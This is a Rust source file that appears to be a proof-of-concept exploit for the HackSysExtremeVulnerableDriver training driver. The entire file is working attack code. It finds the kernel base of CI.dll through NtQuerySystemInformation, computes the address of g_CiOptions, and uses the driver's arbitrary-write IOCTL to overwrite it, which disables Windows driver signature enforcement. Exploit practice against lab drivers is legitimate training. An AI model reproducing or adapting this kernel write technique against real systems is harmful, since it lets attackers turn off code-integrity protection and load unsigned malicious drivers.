mod util;
use std::ffi::c_void;

use std::ptr::null_mut;
use std::{
    mem,
    os::raw::{c_ulong, c_ushort},
    ptr::addr_of,
    slice,
};
use std::str;

use util::IOCTL_ARBITRARY_WRITE;
use util::SYSTEM_MODULE_INFORMATION;
use util::_RTL_PROCESS_MODULE_INFORMATION;
use util::RTLProcessModules;
use util::ModuleEntry;
use util::OFFSET_TO_G_CIOPTION;




use windows::core::w;
use windows::Win32::Foundation::{HANDLE, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
use windows::Win32::Storage::FileSystem::CreateFileW;
use windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES;
use windows::Win32::Storage::FileSystem::{CREATE_ALWAYS, OPEN_EXISTING};
use windows::Win32::Storage::FileSystem::{
    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_SHARE_WRITE,
};
use windows::Win32::System::IO::DeviceIoControl;
use windows::Wdk::System::SystemInformation::NtQuerySystemInformation;
use windows::Win32::Foundation::STATUS_INFO_LENGTH_MISMATCH;



pub unsafe fn contact_driver() -> HANDLE {
    let device_name = w!("\\\\.\\HackSysExtremeVulnerableDriver");
    let handle = CreateFileW(
        device_name,
        FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_FLAGS_AND_ATTRIBUTES(0),
        HANDLE(0 as *mut c_void),
    );

    match handle {
        Ok(handle) => handle,
        Err(error) => {
            println!("Error: {:?}", error);
            HANDLE(0 as *mut c_void)
        }
    }
}

unsafe fn hevd_arbitrary_write(driver_handle: HANDLE, address: *mut c_void) {
    let null_buffer: [u8;8] = [0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00];
    let ptr_to_null : *mut c_void = null_buffer.as_ptr() as *mut c_void; 
    let mut buffer: [u8; 16] = [0x41; 16];
    buffer[8..].copy_from_slice(&(address as u64).to_le_bytes());
    buffer[0..8].copy_from_slice(&(ptr_to_null as u64).to_le_bytes());

    let result = DeviceIoControl(
        driver_handle,
        IOCTL_ARBITRARY_WRITE,
        Some(buffer.as_mut_ptr() as *mut c_void),
        0,
        None,
        0,
        None,
        None,
    );
}


unsafe fn GetKernelModuleAddress(module_name:&str) -> *mut c_void {
    let buffer = [0u8; 0x00];
    let mut size :usize = 0x00;
    let mut bytes_returned = 0u32;
    
    
    let status = NtQuerySystemInformation(
        SYSTEM_MODULE_INFORMATION,
        buffer.as_ptr() as *mut c_void,
        buffer.len() as u32,
        &mut bytes_returned,
    );
    
    
    let size = bytes_returned as usize;
    let buffer = vec![0u8; bytes_returned as usize];
    
    let status = NtQuerySystemInformation(
        SYSTEM_MODULE_INFORMATION,
        buffer.as_ptr() as *mut c_void,
        bytes_returned as u32,
        &mut bytes_returned,
    );
        
    let module_table = get_module_table(&buffer);
    for module in module_table {
        if let Ok(s) = str::from_utf8(module.FullPathName().as_ref()) {
            if s.contains(module_name) {
                let base_address = module.ImageBase();
                return base_address
        }
        } 

    }
    null_mut()
}
    
    
    
        
    



fn get_module_table(buffer: &[u8]) -> &[ModuleEntry] {
    let info_ptr: *const RTLProcessModules = buffer.as_ptr().cast();
    // get a pointer to `Handles`, and cast it to `*const HandleEntry`
    let table_ptr: *const ModuleEntry = unsafe { addr_of!((*info_ptr).modules).cast() };
    // read the length as an unaligned `usize`
    let len = unsafe { addr_of!((*info_ptr).number_of_modules).read_unaligned() };
    // ensure that the table fits within `buffer`
    let table_offset = unsafe { table_ptr.cast::<u8>().offset_from(buffer.as_ptr()) };
    let max_len = (buffer.len() - table_offset as usize) / mem::size_of::<ModuleEntry>();
    assert!(len <= max_len);
    // create a `&[HandleEntry]` from the pointer and length
    unsafe { slice::from_raw_parts(table_ptr, len as usize) }
}


fn main() {
    unsafe {
        

        
        let ci_base_address = GetKernelModuleAddress("CI.dll");
        if ci_base_address == null_mut() {
            println!("Failed to get CI.dll base address");
            return;
        }
        
        let g_cioption = ci_base_address.wrapping_add(OFFSET_TO_G_CIOPTION);
        

        let driver_handle = contact_driver();
        if driver_handle.0 == 0 as *mut c_void {
            println!("Failed to get driver handle");
            return;
        }

        hevd_arbitrary_write(driver_handle,g_cioption);


    }
}
